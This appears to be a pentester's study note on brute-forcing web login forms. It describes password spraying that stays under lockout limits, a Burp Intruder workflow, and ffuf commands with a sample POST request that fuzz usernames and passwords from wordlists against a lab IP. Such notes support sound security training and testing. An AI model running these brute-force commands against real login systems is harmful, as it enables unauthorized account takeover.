#auth #ffuf 
## What is it?

Password-based authentication generally allows to register an account and set a password, or sometimes an account will be assigned to them by an administrator. Password-based authentication tends to be suseptible to brute-force attacks, account lockouts and credential stuffing attacks.

**A simple example**
-   A vulnerable web application allows users to sign up and set a password.
-   After 10 failed login attempts, an account is locked.
-   If an attacker uses 9 common passwords against many user accounts, they will gain access to ones that chose weak or common passwords.

Broken authentication can often lead to:
-   Account takeover
-   Sensitive data exposure

---

### Burpsuite Method
- Burpsuite > Send to Intruder > Sniper, add payload marker to password, Payload settings load /usr/share/seclists/SecListsMaster/Passwords/ >Start Attack
	- Look for length changes in results

### FFUF Method
- Save `POST` request from Burpsuite to .txt
	- change password value to `FUZZ`
```
ffuf -request req.txt -request-proto http -w /usr/share/seclist/SecLists-Master/Passwords/xato-net-10-million-passwords-10000.txt -fs 1814
```
- this command sends the `POST` request, fuzzing the password field with the specified wordlist, using protocol http and filter file size for sizes other than 1814.

[Steps](https://notes.benheater.com/books/web/page/use-ffuf-to-brute-force-login)

- Request.txt file
```d
POST /login HTTP/1.1
Host: 10.10.10.10
Content-Length: 37
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Content-Type: application/json
Origin: http://10.10.10.10
Referer: http://10.10.10.10/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"username":"USERFUZZ","password":"PASSFUZZ"}
```
- #ffuf command to bruteforce logins
```d
ffuf -request request.txt -request-proto http -mode clusterbomb -w /path/to/users/file.txt:USERFUZZ -w /path/to/password/file.txt:PASSFUZZ -mc 200
```